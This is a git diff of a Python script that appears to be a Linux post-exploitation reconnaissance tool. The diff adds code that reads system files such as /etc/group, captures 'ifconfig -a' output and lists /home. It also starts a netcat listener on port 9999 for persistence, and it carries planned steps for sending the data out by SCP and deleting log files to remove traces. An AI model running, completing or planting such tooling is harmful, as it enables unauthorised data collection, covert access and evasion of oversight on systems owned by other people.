@@ -31,7 +31,9 @@ __maintainer__ = "scottyrotten"
 
 import argparse
 import os
+import subprocess
 import platform
+import tarfile
 
 ##########################################
 
@@ -43,8 +45,9 @@ args = parser.parse_args()
 
 # Setup
 
+WORKDIR = os.mkdir(args.directory)
 OSTYPE = platform.linux_distribution()
-OUTFILE = open(args.directory, 'w+')
+OUTFILE = open(args.directory + '/output.txt', 'w+')
 SYSFILES = [
     '/etc/issue',
     #'/etc/*-release'
@@ -56,6 +59,13 @@ SYSFILES = [
     '/etc/group',
     #'/etc/sudoers',
 ]
+
+# Common SYSFILES
+
+# RHEL SYSFILES
+
+# Ubuntu SYSFILES
+
 
 '''
 EXEC = [
@@ -73,39 +83,57 @@ EXEC = [
     '/usr/bin/ps -ef | grep root'
 ]
 '''
-#OUTPUT FILE COLORS
-
-ENDC = '\033[0m'
-HEADER = '\033[95m'
-
-#Determine if Debian, RHEL
-
-if OSTYPE[0] == 'Ubuntu':
-    print "Ubuntu"
-else:
-    print "RHEL"
 
 # Define function to read files and write to output
 
 def fileRead(file_list):
     for i in file_list:
         with open(i, 'r') as file:
-            OUTFILE.write(HEADER+ 25 * '#' +ENDC)
-            OUTFILE.write('\n\n')
+            OUTFILE.write('\n')
+            OUTFILE.write(25 * '#')
+            OUTFILE.write(i)
+            OUTFILE.write('\n')
+            OUTFILE.write('\n')
             OUTFILE.write(file.read())
+
+#MAIN
 
 fileRead(SYSFILES)
 
+NET = subprocess.Popen(['ifconfig', '-a'], stdout=subprocess.PIPE)
+NETOUT = NET.communicate()[0]
+OUTFILE.write(25 * '#')
+OUTFILE.write('ifconfig -a')
+OUTFILE.write('\n')
+OUTFILE.write('\n')
+OUTFILE.write(NETOUT)
+
+#Determine if Debian, RHEL
+
+'''
+if OSTYPE[0] == 'Ubuntu':
+    fileRead(DEBIAN)
+else:
+    fileRead(RHEL)
+'''
+
 # List directories
 
+'''
 for root, dirs, filenames in os.walk('/home/'):
     for name in filenames:
+        OUTFILE.write('\n')
         OUTFILE.write(os.path.join(root, name))
     for name in dirs:
+        OUTFILE.write('\n')
         OUTFILE.write(os.path.join(root, name))
-
+'''
 
 # Exfil collected data (zip up, SCP back to remote host)
+
+# Netcat persistance with Bash
+
+subprocess.Popen(['nc', '-l', '-p', '9999'])
 
 # Cleanup log files to remove traces of recon from system
 
